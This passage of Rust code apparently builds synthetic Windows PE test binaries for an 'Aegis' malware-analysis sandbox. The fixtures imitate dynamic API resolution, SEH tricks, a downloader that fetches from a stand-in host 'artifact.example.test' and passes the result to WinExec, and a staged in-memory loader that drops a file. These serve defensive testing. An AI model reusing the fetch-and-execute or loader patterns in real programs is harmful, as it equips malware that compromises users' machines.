    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(ANSI_DESCRIPTOR_RVA));
    mov_imm64(&mut code, 8, 0);
    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(API_OUTPUT_RVA));
    call_iat(&mut code, 6);
    load_rax_rip(&mut code, API_OUTPUT_RVA);
    code.extend_from_slice(&[0xff, 0xd0]); // call dynamically resolved GetCurrentProcessId

    mov_imm64(&mut code, 1, 0);
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(DELAY_RVA));
    call_iat(&mut code, 7);

    mov_imm64(&mut code, 1, u64::MAX);
    mov_imm64(&mut code, 2, 0);
    mov_imm64(&mut code, 8, IMAGE_BASE + u64::from(QUERY_OUTPUT_RVA));
    mov_imm64(&mut code, 9, 16);
    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(QUERY_LENGTH_RVA));
    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x20]);
    mov_imm64(&mut code, 1, u64::MAX);
    call_iat(&mut code, 8);

    code.extend_from_slice(&[0x4c, 0x89, 0xf1]); // mov rcx,r14
    code.extend_from_slice(&[0x49, 0x8d, 0x44, 0x24, 0x20]); // lea rax,[r12+20h]
    code.extend_from_slice(&[0xff, 0xd0]); // call rax
    mov_imm64(&mut code, 1, 0);
    call_iat(&mut code, 9);
    code.push(0xf4);
    assert!(code.len() < (MODULE_RVA - CODE_RVA) as usize);
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);

    write_c_string(&mut bytes, 0x700, b"KERNEL32.dll");
    write_c_string(&mut bytes, 0x720, b"GetTickCount");
    let mut stage = [0u8; 64];
    stage[..19].copy_from_slice(b"MZ AEGIS_UNPACKED\0\0");
    stage[0x20..0x2b].copy_from_slice(&[
        0x48, 0x83, 0xec, 0x28, 0xff, 0xd1, 0x48, 0x83, 0xc4, 0x28, 0xc3,
    ]);
    bytes[0x740..0x780].copy_from_slice(&stage);
    bytes[0x780..0x788].copy_from_slice(&(-250_000i64).to_le_bytes());
    bytes[0x788..0x790].copy_from_slice(&0u64.to_le_bytes());
    bytes[0x790..0x798].copy_from_slice(&0x1000u64.to_le_bytes());
    bytes[0x798..0x79c].copy_from_slice(&0u32.to_le_bytes());
    let module_wide: Vec<u8> = "KERNEL32.dll"
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect();
    put_u16(&mut bytes, 0x7a0, module_wide.len() as u16);
    put_u16(&mut bytes, 0x7a2, module_wide.len() as u16 + 2);
    put_u64(
        &mut bytes,
        0x7a8,
        IMAGE_BASE + u64::from(UNICODE_BUFFER_RVA),
    );
    bytes[0x7b0..0x7b0 + module_wide.len()].copy_from_slice(&module_wide);
    let native_symbol = b"GetCurrentProcessId";
    put_u16(&mut bytes, 0x7e0, native_symbol.len() as u16);
    put_u16(&mut bytes, 0x7e2, native_symbol.len() as u16 + 1);
    put_u64(&mut bytes, 0x7e8, IMAGE_BASE + u64::from(ANSI_BUFFER_RVA));
    bytes[0x7c8..0x7c8 + native_symbol.len()].copy_from_slice(native_symbol);

    put_u32(&mut bytes, 0x800, LOOKUP_RVA);
    let mut name_raw = 0x980usize;
    let mut name_rvas = Vec::new();
    for import in imports {
        let rva = 0x2000 + (name_raw - 0x800) as u32;
        name_rvas.push(rva);
        write_hint_name(&mut bytes, name_raw, import);
        name_raw = (name_raw + import.len() + 3) & !1;
    }
    let dll_rva = 0x2000 + (name_raw - 0x800) as u32;
    write_c_string(&mut bytes, name_raw, b"KERNEL32.dll");
    put_u32(&mut bytes, 0x80c, dll_rva);
    put_u32(&mut bytes, 0x810, IAT_RVA);
    for (index, name_rva) in name_rvas.into_iter().enumerate() {
        put_u64(&mut bytes, 0x840 + index * 8, u64::from(name_rva));
        put_u64(&mut bytes, 0x8e0 + index * 8, u64::from(name_rva));
    }
    bytes
}

pub fn dynamic_resolution_pe32() -> Vec<u8> {
    let mut bytes = safe_dynamic_pe32();
    let code = [
        0x68, 0x00, 0x11, 0x40, 0x00, // push "KERNEL32.dll"
        0xff, 0x15, 0x60, 0x20, 0x40, 0x00, // call [LoadLibraryA]
        0x68, 0x20, 0x11, 0x40, 0x00, // push "GetCurrentProcessId"
        0x50, // push eax module handle
        0xff, 0x15, 0x64, 0x20, 0x40, 0x00, // call [GetProcAddress]
        0xff, 0xd0, // call eax dynamic stub
        0x6a, 0x00, // push 0
        0xff, 0x15, 0x68, 0x20, 0x40, 0x00, // call [ExitProcess]
        0xcc,
    ];
    bytes[0x200..0x400].fill(0);
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
    write_c_string(&mut bytes, 0x300, b"KERNEL32.dll");
    write_c_string(&mut bytes, 0x320, b"GetCurrentProcessId");

    for (index, name_rva) in [0x20c8, 0x20d8, 0x20b4, 0].into_iter().enumerate() {
        put_u32(&mut bytes, 0x440 + index * 4, name_rva);
        put_u32(&mut bytes, 0x460 + index * 4, name_rva);
    }
    for index in 4..7 {
        put_u32(&mut bytes, 0x440 + index * 4, 0);
        put_u32(&mut bytes, 0x460 + index * 4, 0);
    }
    write_hint_name(&mut bytes, 0x4c8, b"LoadLibraryA");
    write_hint_name(&mut bytes, 0x4d8, b"GetProcAddress");
    bytes
}

pub fn seh_pe32() -> Vec<u8> {
    let mut bytes = safe_dynamic_pe32();
    let code = [
        0x68, 0x00, 0x11, 0x40, 0x00, // push handler
        0x6a, 0xff, // push end-of-chain
        0x64, 0x89, 0x25, 0x00, 0x00, 0x00, 0x00, // mov fs:[0], esp
        0xcc, // breakpoint dispatched through SEH
        0x6a, 0x00, // push 0
        0xff, 0x15, 0x6c, 0x20, 0x40, 0x00, // call [ExitProcess]
        0xf4,
    ];
    let handler = [
        0xb8, 0xff, 0xff, 0xff, 0xff, // mov eax, EXCEPTION_CONTINUE_EXECUTION
        0xc2, 0x10, 0x00, // ret 16
    ];
    bytes[0x200..0x400].fill(0);
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
    bytes[0x300..0x300 + handler.len()].copy_from_slice(&handler);
    bytes
}

pub fn threads_pe32() -> Vec<u8> {
    let mut bytes = safe_dynamic_pe32();
    let mut code = vec![
        0x6a, 0x00, // thread ID pointer
        0x6a, 0x00, // creation flags
        0x6a, 0x2a, // parameter
        0x68, 0x00, 0x11, 0x40, 0x00, // thread start
        0x6a, 0x00, // default stack
        0x6a, 0x00, // security attributes
        0xff, 0x15, 0x60, 0x20, 0x40, 0x00, // CreateThread
    ];
    code.extend(std::iter::repeat_n(0x90, 100));
    code.extend([0x6a, 0x00, 0xff, 0x15, 0x6c, 0x20, 0x40, 0x00, 0xf4]);
    let thread = [0x8b, 0x44, 0x24, 0x04, 0xc2, 0x04, 0x00]; // return parameter as exit code
    bytes[0x200..0x400].fill(0);
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
    bytes[0x300..0x300 + thread.len()].copy_from_slice(&thread);
    write_hint_name(&mut bytes, 0x490, b"CreateThread");
    bytes
}

pub fn instruction_coverage_pe32() -> Vec<u8> {
    let mut bytes = safe_dynamic_pe32();
    let code = [
        0xb8, 0x00, 0x00, 0xc0, 0x3f, // mov eax, 1.5f
        0x66, 0x0f, 0x6e, 0xc0, // movd xmm0, eax
        0xbb, 0x00, 0x00, 0x00, 0x40, // mov ebx, 2.0f
        0x66, 0x0f, 0x6e, 0xcb, // movd xmm1, ebx
        0xf3, 0x0f, 0x58, 0xc1, // addss xmm0, xmm1
        0x66, 0x0f, 0x7e, 0xc1, // movd ecx, xmm0
        0x0f, 0xba, 0xe9, 0x03, // bts ecx, 3
        0x0f, 0xbc, 0xd1, // bsf edx, ecx
        0xd9, 0xe8, // fld1
        0xd9, 0xe8, // fld1
        0xde, 0xc1, // faddp st(1), st(0)
        0xd9, 0x1d, 0x00, 0x21, 0x40, 0x00, // fstp [0x402100]
        0x6a, 0x00, 0xff, 0x15, 0x6c, 0x20, 0x40, 0x00, // ExitProcess
        0xf4,
    ];
    bytes[0x200..0x400].fill(0);
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
    bytes
}

pub fn system_objects_pe32() -> Vec<u8> {
    let mut bytes = safe_dynamic_pe32();
    let code = [
        0x68, 0x00, 0x11, 0x40, 0x00, // name
        0x6a, 0x00, // initial state
        0x6a, 0x00, // auto reset
        0x6a, 0x00, // security
        0xff, 0x15, 0x60, 0x20, 0x40, 0x00, // CreateEventA
        0x89, 0xc3, // mov ebx,eax
        0x6a, 0x00, 0x53, 0xff, 0x15, 0x64, 0x20, 0x40,
        0x00, // WaitForSingleObject -> timeout
        0x53, 0xff, 0x15, 0x68, 0x20, 0x40, 0x00, // SetEvent
        0x6a, 0x00, 0x53, 0xff, 0x15, 0x64, 0x20, 0x40,
        0x00, // WaitForSingleObject -> signaled
        0x6a, 0x00, 0xff, 0x15, 0x6c, 0x20, 0x40, 0x00, // ExitProcess
        0xf4,
    ];
    bytes[0x200..0x400].fill(0);
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
    write_c_string(&mut bytes, 0x300, b"AegisReady");
    for (index, name_rva) in [0x2090, 0x20c8, 0x20e0, 0x20f0, 0].into_iter().enumerate() {
        put_u32(&mut bytes, 0x440 + index * 4, name_rva);
        put_u32(&mut bytes, 0x460 + index * 4, name_rva);
    }
    write_hint_name(&mut bytes, 0x490, b"CreateEventA");
    write_hint_name(&mut bytes, 0x4c8, b"WaitForSingleObject");
    write_hint_name(&mut bytes, 0x4e0, b"SetEvent");
    write_hint_name(&mut bytes, 0x4f0, b"ExitProcess");
    bytes
}

pub fn network_scenario_pe32() -> Vec<u8> {
    let mut bytes = safe_dynamic_pe32();
    let code = [
        0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x68, 0x00, 0x11, 0x40, 0x00, 0xff, 0x15,
        0x60, 0x20, 0x40, 0x00, // InternetOpenA
        0x89, 0xc3, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x68, 0x40, 0x11, 0x40, 0x00,
        0x53, 0xff, 0x15, 0x64, 0x20, 0x40, 0x00, // InternetOpenUrlA
        0x89, 0xc6, 0x68, 0x7c, 0x21, 0x40, 0x00, 0x68, 0x00, 0x01, 0x00, 0x00, 0x68, 0x80, 0x21,
        0x40, 0x00, 0x56, 0xff, 0x15, 0x68, 0x20, 0x40, 0x00, // InternetReadFile
        0x6a, 0x01, 0x68, 0x80, 0x21, 0x40, 0x00, 0xff, 0x15, 0x6c, 0x20, 0x40,
        0x00, // WinExec downloaded command buffer (captured only)
        0x6a, 0x00, 0xff, 0x15, 0x70, 0x20, 0x40, 0x00, // ExitProcess
        0xf4,
    ];
    bytes[0x200..0x400].fill(0);
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
    write_c_string(&mut bytes, 0x300, b"AegisNetworkFixture");
    write_c_string(&mut bytes, 0x340, b"http://artifact.example.test/start");
    put_u32(&mut bytes, 0x98 + 196, 0x18);
    for (index, name_rva) in [0x2090, 0x20c8, 0x2100, 0x2120, 0x2130, 0]
        .into_iter()
        .enumerate()
    {
        put_u32(&mut bytes, 0x440 + index * 4, name_rva);
        put_u32(&mut bytes, 0x460 + index * 4, name_rva);
    }
    write_hint_name(&mut bytes, 0x490, b"InternetOpenA");
    write_hint_name(&mut bytes, 0x4c8, b"InternetOpenUrlA");
    write_hint_name(&mut bytes, 0x500, b"InternetReadFile");
    write_hint_name(&mut bytes, 0x520, b"WinExec");
    write_hint_name(&mut bytes, 0x530, b"ExitProcess");
    bytes
}

pub fn runtime_artifact_pe32() -> Vec<u8> {
    let mut bytes = safe_dynamic_pe32();
    let payload = b"MZ AEGIS_SAFE_RUNTIME_ARTIFACT powershell https://artifact.example.test\0";
    let stage_two = b"\x6a\x00\xff\x15\x78\x20\x40\x00\xcc AEGIS_SAFE_RUNTIME_ARTIFACT_STAGE_2\0";
    let code = [
        0x6a,
        0x04,
        0x68,
        0x00,
        0x30,
        0x00,
        0x00,
        0x68,
        0x00,
        0x10,
        0x00,
        0x00,
        0x6a,
        0x00,
        0xff,
        0x15,
        0x60,
        0x20,
        0x40,
        0x00, // VirtualAlloc
        0x89,
        0xc3, // mov ebx,eax
        0x6a,
        payload.len() as u8,
        0x68,
        0x20,
        0x11,
        0x40,
        0x00,
        0x53,
        0xff,
        0x15,
        0x64,
        0x20,
        0x40,
        0x00, // RtlMoveMemory
        0x68,
        0xe0,
        0x11,
        0x40,
        0x00,
        0x6a,
        0x20,
        0x6a,
        payload.len() as u8,
        0x53,
        0xff,
        0x15,
        0x68,
        0x20,
        0x40,
        0x00, // VirtualProtect
        0x68,
        0xe0,
        0x11,
        0x40,
        0x00,
        0x6a,
        0x04,
        0x6a,
        stage_two.len() as u8,
        0x53,
        0xff,
        0x15,
        0x68,
        0x20,
        0x40,
        0x00, // VirtualProtect back to read/write
        0x6a,
        stage_two.len() as u8,
        0x68,
        0xc0,
        0x11,
        0x40,
        0x00,
        0x53,
        0xff,
        0x15,
        0x64,
        0x20,
        0x40,
        0x00, // RtlMoveMemory stage two
        0x68,
        0xe0,
        0x11,
        0x40,
        0x00,
        0x6a,
        0x20,
        0x6a,
        stage_two.len() as u8,
        0x53,
        0xff,
        0x15,
        0x68,
        0x20,
        0x40,
        0x00, // VirtualProtect stage two executable
        0x6a,
        0x00,
        0x6a,
        0x00,
        0x6a,
        0x02,
        0x6a,
        0x00,
        0x6a,
        0x00,
        0x68,
        0x00,
        0x00,
        0x00,
        0x40,
        0x68,
        0x80,
        0x11,
        0x40,
        0x00,
        0xff,
        0x15,
        0x6c,
        0x20,
        0x40,
        0x00, // CreateFileA
        0x89,
        0xc6, // mov esi,eax
        0x6a,
        0x00,
        0x68,
        0xe4,
        0x11,
        0x40,
        0x00,
        0x6a,
        payload.len() as u8,
        0x68,
        0x20,
        0x11,
        0x40,
        0x00,
        0x56,
        0xff,
        0x15,
        0x70,
        0x20,
        0x40,
        0x00, // WriteFile
        0x56,
        0xff,
        0x15,
        0x74,
        0x20,
        0x40,
        0x00, // CloseHandle
        0xff,
        0xd3, // call ebx: safely re-enter stage two
        0x6a,
        0x00,
        0xff,
        0x15,
        0x78,
        0x20,
        0x40,
        0x00,
        0xcc,
    ];
    bytes[0x200..0x400].fill(0);
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
    bytes[0x320..0x320 + payload.len()].copy_from_slice(payload);
    write_c_string(&mut bytes, 0x380, b"C:\\Temp\\aegis-runtime.bin");
    bytes[0x3c0..0x3c0 + stage_two.len()].copy_from_slice(stage_two);
    let names = [0x2090, 0x20a0, 0x20b4, 0x20c8, 0x20d8, 0x20e8, 0x20f8, 0];
    for (index, name_rva) in names.into_iter().enumerate() {
        put_u32(&mut bytes, 0x440 + index * 4, name_rva);
        put_u32(&mut bytes, 0x460 + index * 4, name_rva);
    }
    write_hint_name(&mut bytes, 0x490, b"VirtualAlloc");
    write_hint_name(&mut bytes, 0x4a0, b"RtlMoveMemory");
    write_hint_name(&mut bytes, 0x4b4, b"VirtualProtect");
    write_hint_name(&mut bytes, 0x4c8, b"CreateFileA");
    write_hint_name(&mut bytes, 0x4d8, b"WriteFile");
    write_hint_name(&mut bytes, 0x4e8, b"CloseHandle");
    write_hint_name(&mut bytes, 0x4f8, b"ExitProcess");
    bytes
}

fn write_section(bytes: &mut [u8], offset: usize, name: &[u8], layout: (u32, u32, u32, u32, u32)) {
    let (virtual_size, virtual_address, raw_size, raw_offset, characteristics) = layout;
    bytes[offset..offset + name.len().min(8)].copy_from_slice(&name[..name.len().min(8)]);
    put_u32(bytes, offset + 8, virtual_size);
    put_u32(bytes, offset + 12, virtual_address);
    put_u32(bytes, offset + 16, raw_size);
    put_u32(bytes, offset + 20, raw_offset);
    put_u32(bytes, offset + 36, characteristics);
}

fn write_hint_name(bytes: &mut [u8], offset: usize, value: &[u8]) {
    put_u16(bytes, offset, 0);
    write_c_string(bytes, offset + 2, value);
}

fn write_c_string(bytes: &mut [u8], offset: usize, value: &[u8]) {
    bytes[offset..offset + value.len()].copy_from_slice(value);
    bytes[offset + value.len()] = 0;
}

fn put_u16(bytes: &mut [u8], offset: usize, value: u16) {
    bytes[offset..offset + 2].copy_from_slice(&value.to_le_bytes());
}

fn put_u32(bytes: &mut [u8], offset: usize, value: u32) {
    bytes[offset..offset + 4].copy_from_slice(&value.to_le_bytes());
}

fn put_u64(bytes: &mut [u8], offset: usize, value: u64) {
    bytes[offset..offset + 8].copy_from_slice(&value.to_le_bytes());
}
